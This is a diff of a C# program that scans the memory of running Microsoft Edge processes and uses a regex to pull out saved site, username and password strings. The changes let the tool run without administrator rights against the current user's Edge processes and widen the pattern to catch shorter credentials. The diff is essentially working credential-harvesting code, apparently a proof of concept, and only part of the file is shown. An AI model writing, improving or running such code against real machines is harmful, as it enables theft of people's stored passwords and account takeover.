@@ -7,8 +7,6 @@ using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
 
-
-
 class Program
 {
     const uint PROCESS_QUERY_INFORMATION = 0x0400;
@@ -51,7 +49,6 @@ class Program
         public string CommandLine { get; set; }
     }
 
-
     static string GetProcessOwnerFromToken(int pid)
     {
         IntPtr hProcess = OpenProcess(0x1000 /* QUERY_LIMITED_INFORMATION */, false, pid);
@@ -78,7 +75,6 @@ class Program
         }
     }
 
-
     static void Main()
     {
         // Check if running elevated (admin)
@@ -91,14 +87,17 @@ class Program
             Console.ForegroundColor = ConsoleColor.Red;
             Console.Write("[x]");
             Console.ResetColor();
-            Console.WriteLine(" Not running elevated");
-            return; // or Environment.Exit(1);
+            Console.WriteLine(" Not running elevated.\n\nProgram will only be able to access Edge processes ran by the same user.");
+            Console.WriteLine("The program might also fail trying to look up owner of some Edge processes.\n");
+            //return; 
         }
-
-        Console.ForegroundColor = ConsoleColor.Green;
-        Console.Write("[v]");
-        Console.ResetColor();
-        Console.WriteLine(" Running elevated\n");
+        else
+        {
+            Console.ForegroundColor = ConsoleColor.Green;
+            Console.Write("[v]");
+            Console.ResetColor();
+            Console.WriteLine(" Running elevated.\n");
+        }
 
         Console.Write("Fetching browser processes:");
         int totalMatches = 0;
@@ -183,11 +182,10 @@ class Program
                             string utf8 = Encoding.UTF8.GetString(buffer);
                             string[] lines = Regex.Split(utf8, @"\r\n|\r|\n");
 
-
                             foreach (var line in lines)
                             {
                                 // Pattern for saved passwords - Notice \x20 og \x00 - this is the pattern to look for in memory
-                                string pattern = @"[a-zA-Z]https?\x20([a-zA-ZæøåÆØÅ0-9\\-_\.@\?]{3,20})\x20([a-zA-ZæøåÆØÅ0-9#!@#\$%\^&\*\(\)_\-\+=\{\}\[\]:;<>\?/~\s]{6,40})\x20\x00"; 
+                                string pattern = @"[a-zA-Z]https?\x20([a-zA-ZæøåÆØÅ0-9\\-_\.@\?]{1,20})\x20([a-zA-ZæøåÆØÅ0-9#!@#\$%\^&\*\(\)_\-\+=\{\}\[\]:;<>\?/~\s]{1,40})\x20\x00"; 
 
                                 MatchCollection matches = Regex.Matches(line, pattern);
 
@@ -214,15 +212,11 @@ class Program
                                             totalMatches++;
                                         }
                                     }
-
                                     alreadyCheckedUsers.Add($"{proc.Owner} {proc.Name}");
                                 }
-
                             }
                         }
-
                     }
-
                     address = new IntPtr(memInfo.BaseAddress.ToInt64() + (long)memInfo.RegionSize);
                 }
 
@@ -235,4 +229,3 @@ class Program
         Console.WriteLine($"\nTotal matches found across all processes: {totalMatches}. {shownMatches} shown.");
     }
 }
-
